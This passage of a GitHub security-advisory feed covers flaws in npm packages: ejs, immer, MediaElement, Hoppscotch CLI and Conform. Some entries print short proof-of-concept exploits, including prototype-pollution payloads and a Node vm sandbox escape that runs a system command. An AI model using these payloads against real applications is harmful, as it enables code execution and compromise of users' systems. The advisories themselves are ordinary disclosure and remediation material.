        <published>2024-05-01T10:01:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ejs] ejs lacks certain pollution protection]]></title>
        <id>https://github.com/advisories/GHSA-ghr5-ch3p-vcr6</id>
        <link href="https://github.com/advisories/GHSA-ghr5-ch3p-vcr6"/>
        <updated>2024-05-01T08:25:04.000Z</updated>
        <content type="html"><![CDATA[<p>The ejs (aka Embedded JavaScript templates) package before 3.1.10 for Node.js lacks certain pollution protection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33883">https://nvd.nist.gov/vuln/detail/CVE-2024-33883</a></li>
<li><a href="https://github.com/mde/ejs/commit/e469741dca7df2eb400199e1cdb74621e3f89aa5">https://github.com/mde/ejs/commit/e469741dca7df2eb400199e1cdb74621e3f89aa5</a></li>
<li><a href="https://github.com/mde/ejs/compare/v3.1.9...v3.1.10">https://github.com/mde/ejs/compare/v3.1.9...v3.1.10</a></li>
<li><a href="https://github.com/advisories/GHSA-ghr5-ch3p-vcr6">https://github.com/advisories/GHSA-ghr5-ch3p-vcr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghr5-ch3p-vcr6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-28T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immer] Prototype Pollution in immer]]></title>
        <id>https://github.com/advisories/GHSA-33f9-j839-rf8h</id>
        <link href="https://github.com/advisories/GHSA-33f9-j839-rf8h"/>
        <updated>2024-04-30T20:26:07.000Z</updated>
        <content type="html"><![CDATA[<p>This affects the package immer before 9.0.6. A type confusion vulnerability can lead to a bypass of CVE-2020-28477 when the user-provided keys used in the path parameter are arrays. In particular, this bypass is possible because the condition <code>(p === "__proto__" || p === "constructor")</code> in <code>applyPatches_</code> returns false if <code>p</code> is <code>['__proto__']</code> (or <code>['constructor']</code>). The <code>===</code> operator (strict equality operator) returns false if the operands have different type.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23436">https://nvd.nist.gov/vuln/detail/CVE-2021-23436</a></li>
<li><a href="https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237">https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1540542">https://snyk.io/vuln/SNYK-JS-IMMER-1540542</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1579266">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1579266</a></li>
<li><a href="https://github.com/advisories/GHSA-33f9-j839-rf8h">https://github.com/advisories/GHSA-33f9-j839-rf8h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33f9-j839-rf8h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-09-02T17:17:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immer] Prototype Pollution in immer]]></title>
        <id>https://github.com/advisories/GHSA-9qmh-276g-x5pj</id>
        <link href="https://github.com/advisories/GHSA-9qmh-276g-x5pj"/>
        <updated>2024-04-25T22:17:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="overview">Overview</h2>
<p>Affected versions of immer are vulnerable to Prototype Pollution.</p>
<h2 id="proof-of-exploit">Proof of exploit</h2>
<pre><code class="language-js">const {applyPatches, enablePatches} = require("immer");
enablePatches();
let obj = {};
console.log("Before : " + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ "__proto__", "polluted" ], value: "yes" } ]);
// applyPatches({}, [ { op: 'replace', path: [ "__proto__", "polluted" ], value: "yes" } ]);
console.log("After : " + obj.polluted);
</code></pre>
<h2 id="remediation">Remediation</h2>
<p>Version 8.0.1 contains a <a href="https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5">fix</a> for this vulnerability, updating is recommended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-28477">https://nvd.nist.gov/vuln/detail/CVE-2020-28477</a></li>
<li><a href="https://github.com/immerjs/immer/issues/738">https://github.com/immerjs/immer/issues/738</a></li>
<li><a href="https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5">https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5</a></li>
<li><a href="https://github.com/immerjs/immer/blob/master/src/plugins/patches.ts%23L213">https://github.com/immerjs/immer/blob/master/src/plugins/patches.ts%23L213</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1061986">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1061986</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1019369">https://snyk.io/vuln/SNYK-JS-IMMER-1019369</a></li>
<li><a href="https://www.npmjs.com/package/immer">https://www.npmjs.com/package/immer</a></li>
<li><a href="https://github.com/advisories/GHSA-9qmh-276g-x5pj">https://github.com/advisories/GHSA-9qmh-276g-x5pj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9qmh-276g-x5pj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-01-20T21:27:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[immer] Prototype Pollution in immer]]></title>
        <id>https://github.com/advisories/GHSA-c36v-fmgq-m8hx</id>
        <link href="https://github.com/advisories/GHSA-c36v-fmgq-m8hx"/>
        <updated>2024-04-25T22:09:14.000Z</updated>
        <content type="html"><![CDATA[<p>immer is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3757">https://nvd.nist.gov/vuln/detail/CVE-2021-3757</a></li>
<li><a href="https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237">https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237</a></li>
<li><a href="https://huntr.dev/bounties/23d38099-71cd-42ed-a77a-71e68094adfa">https://huntr.dev/bounties/23d38099-71cd-42ed-a77a-71e68094adfa</a></li>
<li><a href="https://github.com/advisories/GHSA-c36v-fmgq-m8hx">https://github.com/advisories/GHSA-c36v-fmgq-m8hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c36v-fmgq-m8hx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-09-07T22:57:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mediaelement] MediaElement Vulnerable to Reflected XSS ]]></title>
        <id>https://github.com/advisories/GHSA-277w-qpxr-2549</id>
        <link href="https://github.com/advisories/GHSA-277w-qpxr-2549"/>
        <updated>2024-04-25T21:38:57.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in flash/FlashMediaElement.swf in MediaElement.js before 2.21.0, as used in WordPress before 4.5.2, allows remote attackers to inject arbitrary web script or HTML via an obfuscated form of the jsinitfunction parameter, as demonstrated by "jsinitfunctio%gn."</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4567">https://nvd.nist.gov/vuln/detail/CVE-2016-4567</a></li>
<li><a href="https://github.com/johndyer/mediaelement/commit/34834eef8ac830b9145df169ec22016a4350f06e">https://github.com/johndyer/mediaelement/commit/34834eef8ac830b9145df169ec22016a4350f06e</a></li>
<li><a href="https://codex.wordpress.org/Version_4.5.2">https://codex.wordpress.org/Version_4.5.2</a></li>
<li><a href="https://core.trac.wordpress.org/changeset/37371">https://core.trac.wordpress.org/changeset/37371</a></li>
<li><a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c</a></li>
<li><a href="https://github.com/johndyer/mediaelement/blob/master/changelog.md">https://github.com/johndyer/mediaelement/blob/master/changelog.md</a></li>
<li><a href="https://wordpress.org/news/2016/05/wordpress-4-5-2/">https://wordpress.org/news/2016/05/wordpress-4-5-2/</a></li>
<li><a href="https://wpvulndb.com/vulnerabilities/8488">https://wpvulndb.com/vulnerabilities/8488</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/05/07/2">http://www.openwall.com/lists/oss-security/2016/05/07/2</a></li>
<li><a href="http://www.securitytracker.com/id/1035818">http://www.securitytracker.com/id/1035818</a></li>
<li><a href="https://github.com/mediaelement/mediaelement/commit/34834eef8ac830b9145df169ec22016a4350f06e">https://github.com/mediaelement/mediaelement/commit/34834eef8ac830b9145df169ec22016a4350f06e</a></li>
<li><a href="https://contao.org/en/news/contao-3_5_15.html">https://contao.org/en/news/contao-3_5_15.html</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/contao-components/mediaelement/CVE-2016-4567.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/contao-components/mediaelement/CVE-2016-4567.yaml</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/contao/core/CVE-2016-4567.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/contao/core/CVE-2016-4567.yaml</a></li>
<li><a href="https://github.com/mediaelement/mediaelement/blob/b992ccf5f0c04a207d98bbb0868420751a61ec90/changelog.md?plain=1#L1024">https://github.com/mediaelement/mediaelement/blob/b992ccf5f0c04a207d98bbb0868420751a61ec90/changelog.md?plain=1#L1024</a></li>
<li><a href="https://github.com/mediaelement/mediaelement/blob/master/changelog.md">https://github.com/mediaelement/mediaelement/blob/master/changelog.md</a></li>
<li><a href="https://web.archive.org/web/20170205142412/http://www.securitytracker.com/id/1035818">https://web.archive.org/web/20170205142412/http://www.securitytracker.com/id/1035818</a></li>
<li><a href="https://github.com/advisories/GHSA-277w-qpxr-2549">https://github.com/advisories/GHSA-277w-qpxr-2549</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-277w-qpxr-2549</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T03:35:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@hoppscotch/cli] @hoppscotch/cli affected by Sandbox Escape in @hoppscotch/js-sandbox leads to RCE]]></title>
        <id>https://github.com/advisories/GHSA-qmmm-73r2-f8xr</id>
        <link href="https://github.com/advisories/GHSA-qmmm-73r2-f8xr"/>
        <updated>2024-04-25T16:50:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="observations">Observations</h3>
<p>The Hoppscotch desktop app takes multiple precautions to be secure against arbitrary JavaScript and system command execution. It does not render user-controlled HTML or Markdown, uses Tauri instead of Electron, and sandboxes pre-request scripts with a simple yet secure implementation using web workers.</p>
<p>Unfortunately, web workers are not available in a pure Node.js application like Hoppscotch CLI. That is why the <a href="https://github.com/hoppscotch/hoppscotch/tree/main/packages/hoppscotch-js-sandbox">@hoppscotch/js-sandbox</a> package also provides a Javascript sandbox that uses the Node.js <code>vm</code> module. However, the <code>vm</code> module is not safe for sandboxing untrusted Javascript code, as stated <a href="https://nodejs.org/api/vm.html#vm-executing-javascript">in the documentation</a>. This is because <a href="https://thegoodhacker.com/posts/the-unsecure-node-vm-module/">code inside the vm context can break out</a> if it can get a hold of any reference to an object created outside of the vm.</p>
<p>In the case of @hoppscotch/js-sandbox, multiple references to external objects are passed into the vm context to allow pre-request scripts interactions with environment variables and more. But this also allows the pre-request script to escape the sandbox.
<a href="https://github.com/hoppscotch/hoppscotch/blob/faab1d20fde9a6be660db40fc73dcf28f9038008/packages/hoppscotch-js-sandbox/src/pre-request/node-vm/index.ts#L23-L31">packages/hoppscotch-js-sandbox/src/pre-request/node-vm/index.ts</a></p>
<pre><code class="language-js">const { pw, updatedEnvs } = getPreRequestScriptMethods(envs)

// Expose pw to the context
context.pw = pw
context.atob = atob
context.btoa = btoa

// Run the pre-request script in the provided context
runInContext(preRequestScript, context)
</code></pre>
<h3 id="exploitation">Exploitation</h3>
<p>An attacker can use the exposed <code>pw</code> object reference to escape the sandbox and execute arbitrary system commands using the <code>child_process</code> Node.js module. This PoC pre-request script executes the <code>id &gt; /tmp/pwnd</code> system command as soon as a request is sent.</p>
<pre><code class="language-js">outside = pw.constructor.constructor('return this')()
outside.process.mainModule.require('child_process').execSync('id &gt; /tmp/pwnd')
</code></pre>
<p>An attacker who wants to run arbitrary code on the machine of a victim can create a Hoppscotch collection containing a request with a malicious pre-request script and share it with a victim, using the JSON export feature. The victim then has to run the collection with the Hoppscotch CLI. Then the malicious pre-request script executes.</p>
<h3 id="impact">Impact</h3>
<p>This attack gives an attacker arbitrary command execution on the machine of a victim Hoppscotch CLI user. For the attack to succeed, an attacker has to lure the victim into downloading a malicious Hoppscotch collection and running it with the Hoppscotch CLI.</p>
<p>This issue does not impact Hoppscotch Web or Desktop, as they use the safe web worker sandboxing approach.</p>
<h3 id="recommendations">Recommendations</h3>
<p>Hoppscotch CLI and other tools that rely on @hoppscotch/js-sandbox but don't have access to a browser cannot use the web worker sandbox. For these, you can look into other safe JavaScript sandboxing libraries. We think that <a href="https://github.com/laverdet/isolated-vm">isolated-vm</a> looks promising. We discourage the use of <a href="https://github.com/patriksimek/vm2">vm2</a>, which is deprecated because it has arbitrary bypasses. Alternatively, you can introduce an <code>--enable-scripting</code> flag for the CLI and disable scripting by default. Or you can change the threat model and educate users that they should not run untrusted collections as it can lead to RCE.</p>
<h3 id="differences-from-existing-cves">Differences from existing CVEs</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37466">nvd.nist.gov/vuln/detail/CVE-2023-37466</a> : This CVE is regarding an escape of vm2 which we do not even use.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-qmmm-73r2-f8xr">https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-qmmm-73r2-f8xr</a></li>
<li><a href="https://github.com/hoppscotch/hoppscotch/commit/22c6eabd133195d22874250a5ae40cb26b851b01">https://github.com/hoppscotch/hoppscotch/commit/22c6eabd133195d22874250a5ae40cb26b851b01</a></li>
<li><a href="https://github.com/advisories/GHSA-qmmm-73r2-f8xr">https://github.com/advisories/GHSA-qmmm-73r2-f8xr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmmm-73r2-f8xr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-22T18:38:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/yup] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-04-24T14:26:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod");

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@conform-to/zod] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function]]></title>
        <id>https://github.com/advisories/GHSA-624g-8qjg-8qxf</id>
        <link href="https://github.com/advisories/GHSA-624g-8qjg-8qxf"/>
        <updated>2024-04-24T14:26:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod");

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
</code></pre>
<h3 id="details">Details</h3>
<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>
<pre><code class="language-javascript">let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
</code></pre>
<p>This is caused by the lack of object existence checking on <a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>
<h3 id="impact">Impact</h3>
<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>
<li><a href="https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32866">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>
<li><a href="https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>
<li><a href="https://github.com/advisories/GHSA-624g-8qjg-8qxf">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-624g-8qjg-8qxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-23T21:15:55.000Z</published>
    </entry>
</feed>